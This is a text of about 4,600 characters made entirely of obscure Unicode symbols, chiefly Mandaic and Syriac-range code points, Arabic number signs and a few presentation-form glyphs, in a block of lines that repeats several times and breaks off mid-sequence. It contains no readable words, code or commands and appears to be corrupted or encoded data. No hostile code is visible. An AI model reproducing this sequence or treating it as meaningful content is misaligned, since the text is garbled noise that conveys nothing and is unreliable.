࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛??࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛